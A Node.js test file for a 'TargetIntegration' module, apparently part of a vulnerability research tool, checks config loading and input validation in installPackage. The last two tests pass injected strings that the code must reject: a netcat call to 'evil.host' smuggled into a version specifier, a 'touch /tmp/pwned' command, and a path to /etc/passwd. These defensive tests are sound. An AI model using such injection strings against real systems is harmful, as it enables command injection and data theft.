import { test, describe } from 'node:test';
import assert from 'node:assert';
import { TargetIntegration } from '../../src/target-integration/index.js';
import { fileURLToPath } from 'url';
import path from 'path';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

describe('TargetIntegration', () => {
  test('should load valid configuration', async () => {
    const targetIntegration = new TargetIntegration({ dryRun: true });
    const configPath = path.join(__dirname, '../../config/targets/pug.yaml');
    
    const config = await targetIntegration.loadConfig(configPath);
    
    assert.strictEqual(config.name, 'pug');
    assert.strictEqual(config.package, 'pug');
    assert.strictEqual(config.version, '3.0.2');
    assert(Array.isArray(config.entryPoints));
    assert(Array.isArray(config.sinks));
    assert(Array.isArray(config.pollutionPoints));
  });

  test('should validate configuration fields', async () => {
    const targetIntegration = new TargetIntegration({ dryRun: true });
    
    const invalidConfig = {
      name: 'test',
      // missing required fields
    };
    
    assert.throws(() => {
      targetIntegration.validateConfig(invalidConfig);
    }, /Missing required config fields/);
  });

  test('should setup target in dry run mode', async () => {
    const targetIntegration = new TargetIntegration({ dryRun: true });
    const config = {
      name: 'test',
      package: 'test-package',
      version: '1.0.0',
      entryPoints: [{ name: 'test', inputType: 'string' }],
      sinks: ['eval'],
      pollutionPoints: ['test']
    };

    const result = await targetIntegration.setupTarget(config);
    
    assert.strictEqual(result.name, 'test');
    assert.strictEqual(result.isDryRun, true);
  });

  test('installPackage rejects shell metacharacters in the version specifier', async () => {
    const ti = new TargetIntegration({ dryRun: true });
    // Validation runs BEFORE the dry-run and on-disk short-circuits, so these
    // must throw instead of being silently accepted.
    await assert.rejects(
      () => ti.installPackage('lodash', '4.17.21 || nc evil.host 9'),
      /Invalid version specifier/
    );
    await assert.rejects(
      () => ti.installPackage('lodash', '*'),
      /Invalid version specifier/
    );
  });

  test('installPackage rejects an invalid package name before any disk/install step', async () => {
    const ti = new TargetIntegration({ dryRun: true });
    await assert.rejects(
      () => ti.installPackage('lodash; touch /tmp/pwned', '1.0.0'),
      /Invalid package name/
    );
    await assert.rejects(
      () => ti.installPackage('../../etc/passwd', '1.0.0'),
      /Invalid package name/
    );
  });
});